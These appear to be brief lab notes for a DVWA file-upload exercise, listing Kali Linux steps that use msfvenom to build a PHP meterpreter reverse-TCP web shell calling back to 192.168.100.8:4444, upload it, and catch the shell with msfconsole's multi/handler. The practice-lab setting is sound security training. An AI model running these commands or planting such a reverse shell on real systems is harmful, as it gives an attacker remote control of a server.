@@ -1,0 +1,19 @@
+FILE UPLOAD
+
+use test.php
+
+Kali Linux
+1. msfvenom -h 
+2. msfvenom -l payloads | grep php
+3. msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.100.8 lport=4444 -f raw > exploit.php
+4. copy exploit.php content
+5. upload to DVWA
+
+6. msfconsole
+7. use exploit/multi/handler
+8. set payload php/meterpreter/reverse_tcp
+9. show options
+10. set lhost 192.168.100.8
+11. run
+12. run no.5
+13. get shell
